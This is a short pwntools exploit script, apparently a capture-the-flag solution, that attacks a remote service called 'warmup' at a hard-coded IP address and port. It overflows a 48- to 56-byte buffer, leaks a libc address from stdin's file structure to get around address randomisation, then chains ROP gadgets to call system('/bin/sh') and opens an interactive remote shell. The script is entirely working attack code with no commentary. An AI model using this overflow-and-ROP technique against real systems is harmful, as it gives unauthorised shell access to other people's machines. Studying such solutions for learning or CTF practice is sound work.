from pwn import *

bss_seg = 0x601200
vuln = 0x40053d
write = 0x40055d

elf = ELF('./warmup')
# p = elf.process()
libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')
p = remote('141.164.48.191', 10001)

payload = b'a'*48
payload += p64(0x601008)
payload += p64(write)
payload += b'a'*0x30
payload += p64(0x601008)
payload += p64(write)
payload += b'a'*0x38
payload += p64(vuln)

p.send(payload)
sleep(0.1)

p.recv()
p.sendline(b'')

libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['_IO_2_1_stdin_']
print(hex(libc.address))

sleep(0.1)
p.recv()
p.sendline(b'')

payload = b'a'*56
payload += p64(libc.address + 0x00000000000215bf)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.address + 0x00000000000215bf + 1)
payload += p64(libc.sym['system'])

p.sendline(payload)

p.recv()

p.interactive()